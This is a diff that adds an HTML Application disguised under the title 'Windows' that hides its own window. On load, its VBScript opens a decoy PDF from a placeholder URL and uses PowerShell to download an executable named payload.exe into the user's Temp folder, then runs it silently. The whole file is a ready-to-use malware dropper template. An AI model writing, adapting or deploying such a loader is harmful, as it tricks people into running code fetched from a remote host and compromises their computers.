@@ -1,0 +1,46 @@
+<html>
+<head>
+  <title>Windows</title>
+  <HTA:APPLICATION 
+    ID="HTA"
+    APPLICATIONNAME="Windows"
+    BORDER="none"
+    CAPTION="no"
+    SCROLL="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="hide">
+</head>
+
+<body>
+  <script language="VBScript">
+    Sub window_onload
+        ' Create a shell object to run commands
+        Dim shell, psScriptUrl, tempFile
+        Set shell = CreateObject("WScript.Shell")
+        
+        pdfScriptUrl = "ENTER PDF DOWNLAOD LINK HERE"
+
+        ' Command to open the PDF
+        Dim openPdfCmd
+        openPdfCmd = "powershell.exe -Command Start-Process '" & pdfScriptUrl & "'"
+        
+        ' Open the PDF using the shell object
+        shell.Run openPdfCmd, 0, False
+        
+
+        ' EXE payload
+        exeUrl = "ENTER EXE DOWNALOD LINK HERE"
+        exePath = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local\Temp\payload.exe"
+
+        ' Download the EXE
+        shell.Run "powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('" & exeUrl & "', '" & exePath & "')", 0, True
+
+        ' Execute it silently
+        shell.Run "powershell.exe -Command Start-Process '" & exePath & "'", 0, False
+            window.close
+
+    End Sub
+  </script>
+</body>
+</html>
